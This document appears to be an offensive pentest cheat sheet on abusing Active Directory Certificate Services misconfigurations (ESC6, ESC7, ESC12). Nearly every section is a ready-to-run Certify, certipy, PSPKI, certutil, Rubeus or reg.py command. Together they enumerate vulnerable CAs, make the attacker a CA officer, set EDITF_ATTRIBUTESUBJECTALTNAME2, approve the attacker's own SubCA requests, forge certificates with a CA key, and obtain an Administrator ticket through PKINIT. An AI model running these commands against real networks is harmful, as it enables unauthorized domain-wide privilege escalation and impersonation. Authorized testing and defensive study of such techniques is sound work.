---
technique: Certificate Authority Abuse
category: adcs
targets: Certificate Authority
protocols: LDAP, RPC, DCOM
remote_capable: true
tags: adcs esc certificate-authority privesc ca-config
---

# Certificate Authority Abuse

Misconfigured Certificate Authority settings allow privilege escalation. ESC6 exploits the EDITF_ATTRIBUTESUBJECTALTNAME2 flag to allow arbitrary SAN in any request. ESC12 abuses a YubiHSM2 key storage provider to forge certificates when an attacker has shell access on the CA server.

## Windows

### Certify: enumerate CA flags (ESC6)

#powershell #certify #enum

Enumerate CA configuration to find templates that allow enrollee-supplied subjects or client auth.

```powershell title:"ESC6: enumerate CAs to find auth templates"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

### Certify: find enrollee-supplies-subject templates (ESC6)

#powershell #certify #enum #san

List templates where the enrollee can supply the subject name.

```powershell title:"ESC6: list templates with enrollee-supplied subject"
.\Certify.exe /enrolleeSuppliesSubject
```
<!-- cheat
import domain_ip
import users
-->

### Certify: find client auth templates (ESC6)

#powershell #certify #enum #clientauth

List templates with client authentication EKU present.

```powershell title:"ESC6: list templates with client authentication EKU"
.\Certify.exe /clientauth
```
<!-- cheat
import domain_ip
import users
-->

### Certify: request cert with arbitrary SAN (ESC6)

#powershell #certify #san

Request an auth template cert with an arbitrary SAN when EDITF_ATTRIBUTESUBJECTALTNAME2 is set.

```powershell title:"ESC6: request cert with administrator SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"administrator"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### PSPKI: Step 1: install PSPKI (ESC7)

#powershell #pspki #manage-ca #rsat

Install the PSPKI module needed to manipulate CA configuration via DCOM.

```powershell title:"ESC7: install PSPKI module"
Install-Module -Name PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 2: import PSPKI (ESC7)

#powershell #pspki #manage-ca #rsat

Import the PSPKI module needed to manipulate CA configuration via DCOM.

```powershell title:"ESC7: import PSPKI module"
Import-Module PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 3: create CA config reader (ESC7)

#powershell #pspki #manage-ca #rsat

Create a CA registry manager object for reading policy module values over DCOM.

```powershell title:"ESC7: create CA config reader"
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "$ca_fqdn"
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
-->

### PSPKI: Step 4: set CA config root (ESC7)

#powershell #pspki #manage-ca #rsat

Set the config reader to the CA root node before reading policy module values.

```powershell title:"ESC7: set CA config root node"
$configReader.SetRootNode($true)
```
<!-- cheat
-->

### PSPKI: Step 5: read EDITF flags (ESC7)

#powershell #pspki #manage-ca #rsat

Read the current EditFlags value from the CA policy module registry via DCOM.

```powershell title:"ESC7: read current EditFlags from CA policy module"
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```
<!-- cheat
-->

### PSPKI: Step 6: set EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC7)

#powershell #pspki #manage-ca #editf-san

Set the EDITF_ATTRIBUTESUBJECTALTNAME2 bit in CA EditFlags via DCOM; service restart required for the flag to take effect.

```powershell title:"ESC7: set EDITF_ATTRIBUTESUBJECTALTNAME2 via PSPKI DCOM"
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```
<!-- cheat
-->

### PSPKI: Step 4: verify EDITF flags via certutil (ESC7)

#powershell #certutil #editf-san

Verify the EditFlags value was applied correctly via certutil.

```powershell title:"ESC7: verify EditFlags value with certutil"
certutil.exe -config "$ca_fqdn\$ca_name" -getreg "policy\EditFlags"
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
-->

### PSPKI: Step 1: submit cert request for approval (ESC7 alternate)

#powershell #certify #manage-certificates #subca

Submit a cert request to a template requiring manager approval to get a pending request ID.

```powershell title:"ESC7: submit cert request to template requiring approval"
.\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:ApprovalNeeded
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
-->

### PSPKI: Step 2: install PSPKI (ESC7 alternate)

#powershell #pspki #manage-certificates

Install PSPKI for the certificate approval flow.

```powershell title:"ESC7: install PSPKI for approval flow"
Install-Module -Name PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 3: import PSPKI (ESC7 alternate)

#powershell #pspki #manage-certificates

Import PSPKI for the certificate approval flow.

```powershell title:"ESC7: import PSPKI for approval flow"
Import-Module PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 4: approve pending request (ESC7 alternate)

#powershell #pspki #manage-certificates

Approve the pending certificate request as a CA officer.

```powershell title:"ESC7: approve pending SubCA cert with PSPKI"
Get-CertificationAuthority -ComputerName "$ca_fqdn" | Get-PendingRequest -RequestID $request_id | Approve-CertificateRequest
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var request_id
-->

### PSPKI: Step 4: download issued cert (ESC7 alternate)

#powershell #certify #manage-certificates

Download the now-issued certificate by request ID.

```powershell title:"ESC7: download issued cert by request ID"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
var request_id
-->

### certutil: Step 1: import CA cert to user store (ESC12)

#powershell #certutil #yubihsm #shell-access

Import the CA certificate into the current user's personal certificate store on the CA server.

```powershell title:"ESC12: import CA cert into user cert store"
certutil -addstore -user my .\root-ca.cer
```
<!-- cheat
import domain_ip
import users
-->

### certutil: Step 2: bind CA cert to YubiHSM private key (ESC12)

#powershell #certutil #yubihsm

Bind the imported CA certificate to its private key held in the YubiHSM2 KSP.

```powershell title:"ESC12: bind CA cert to YubiHSM2 KSP private key"
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my "$ca_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
-->

### certipy: Step 3: export request cert without key (ESC12)

#powershell #certipy #yubihsm #forge

Extract the certificate from a user PFX before signing it with the CA key.

```powershell title:"ESC12: extract certificate from user PFX"
certipy cert -pfx "$user_pfx" -nokey -out "$user_cert.crt"
```
<!-- cheat
var user_pfx
var user_cert
-->

### certipy: Step 4: export request key without cert (ESC12)

#powershell #certipy #yubihsm #forge

Extract the private key from a user PFX before rebuilding the forged certificate chain.

```powershell title:"ESC12: extract private key from user PFX"
certipy cert -pfx "$user_pfx" -nocert -out "$user_cert.key"
```
<!-- cheat
var user_pfx
var user_cert
-->

### certutil: Step 5: sign forged cert with CA key (ESC12)

#powershell #certutil #yubihsm #forge

Sign a forged certificate containing a custom SAN to impersonate administrator using the CA key via YubiHSM2.

```powershell title:"ESC12: sign forged cert with YubiHSM2-backed CA key"
certutil -sign .\$user_cert.crt new.crt @extension.inf
```
<!-- cheat
import domain_ip
import users
var user_cert
-->

### certutil: Step 6: export signed cert to PFX (ESC12)

#powershell #openssl #forge

Export the signed cert and key to a PFX for use with Rubeus.

```powershell title:"ESC12: export signed cert to PFX with openssl"
openssl.exe pkcs12 -export -in new.crt -inkey $user_cert.key -out administrator.pfx
```
<!-- cheat
import domain_ip
var user_cert
-->

### certutil: Step 7: PKINIT as administrator (ESC12)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the forged certificate to get an administrator TGT.

```powershell title:"ESC12: PKINIT with forged cert via Rubeus"
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /domain:"$domain" /dc:"$dc_name" /show /nowrap
```
<!-- cheat
import domain_ip
import users
var dc_name
-->

## Linux

### certipy: enumerate ESC6

#certipy #enum #editf-san

Check if any CA has the UserSpecifiedSAN (EDITF_ATTRIBUTESUBJECTALTNAME2) flag enabled.

```sh title:"ESC6: check for EDITF_ATTRIBUTESUBJECTALTNAME2 via certipy"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### certipy: Step 1: request cert with arbitrary SAN (ESC6)

#certipy #san #pkinit

With EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA, request any auth template with an arbitrary UPN in the SAN.

```sh title:"ESC6: request cert with arbitrary SAN against User template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: request cert with arbitrary DNS SAN (ESC6)

#certipy #san #pkinit

Request an auth template certificate with an arbitrary DNS SAN to impersonate a computer account.

```sh title:"ESC6: request cert with arbitrary DNS SAN"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -dns $target_fqdn
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var target_fqdn
-->

### certipy: Step 2: PKINIT as administrator (ESC6)

#certipy #pkinit

Authenticate with PKINIT using the cert with the arbitrary SAN.

```sh title:"ESC6: PKINIT with arbitrary SAN cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### certipy: Step 1: add self as CA officer (ESC7)

#certipy #manage-ca #subca

Grant self ManageCertificates (officer) role on the CA.

```sh title:"ESC7: add self as officer on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -add-officer $user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 2: enable SubCA template (ESC7)

#certipy #manage-ca #subca

Enable the SubCA template on the CA.

```sh title:"ESC7: enable SubCA template on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -enable-template SubCA
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 3: submit pending request with admin UPN (ESC7)

#certipy #manage-ca #subca

Submit a cert request with admin UPN against SubCA; it will pend and return a request ID.

```sh title:"ESC7: submit SubCA request with admin UPN (will pend)"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template SubCA -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 4: approve pending request (ESC7)

#certipy #manage-certificates #subca

Approve the pending request as CA officer.

```sh title:"ESC7: approve own pending request as CA officer"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -issue-request $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### certipy: Step 5: retrieve issued cert (ESC7)

#certipy #manage-ca #subca

Retrieve the issued certificate by request ID.

```sh title:"ESC7: retrieve issued cert by request ID"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -retrieve $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### certipy: Step 6: PKINIT as administrator (ESC7)

#certipy #pkinit

Authenticate with PKINIT using the retrieved cert.

```sh title:"ESC7: PKINIT with retrieved administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### reg.py: Step 1: query current EDITF value (ESC7)

#impacket #registry #editf-san

Query the current EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag on the CA via remote registry.

```sh title:"ESC7: query current editflags value via remote registry"
reg.py "$domain"/"$user":"$pass"@"$ca_ip" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$ca_name\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
```
<!-- cheat
import domain_ip
import users
import passwords
var ca_ip
var ca_name
-->

### reg.py: Step 2: set EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC7)

#impacket #registry #editf-san

Write the new EditFlags value to enable EDITF_ATTRIBUTESUBJECTALTNAME2 via remote registry; service restart needed.

```sh title:"ESC7: write new editflags value to enable EDITF_ATTRIBUTESUBJECTALTNAME2"
reg.py "$domain"/"$user":"$pass"@"$ca_ip" add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$ca_name\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd $new_editflags_value
```
<!-- cheat
import domain_ip
import users
import passwords
var ca_ip
var ca_name
var new_editflags_value
-->
